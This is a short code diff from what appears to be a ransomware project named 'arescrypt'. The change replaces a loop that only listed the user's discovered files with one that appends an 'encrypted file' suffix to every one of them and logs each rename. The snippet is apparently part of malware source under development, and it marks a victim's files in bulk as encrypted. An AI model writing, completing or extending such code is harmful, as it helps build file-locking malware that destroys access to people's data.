@@ -53,10 +53,14 @@ namespace arescrypt
                     userSpecificFiles.Add(file);
             fullFileIndex = userSpecificFiles.ToArray();
 
-            // Print out all discovered files.
+            // Code for operation to run on all discovered files.
+            // Remember, application may not have read/write access to all files.
             foreach (string file in fullFileIndex)
-                Console.WriteLine(file);
-                        
+            {
+                if (FileHandler.appendSuffixToFile(config.encryptedFileSuffix, file))
+                    Console.WriteLine("File, " + file + ", was renamed successfully.");
+            }
+            
             // Giving "Debug Mode" switch in Configuration it's usability
             if (config.debugMode) // == true
             {
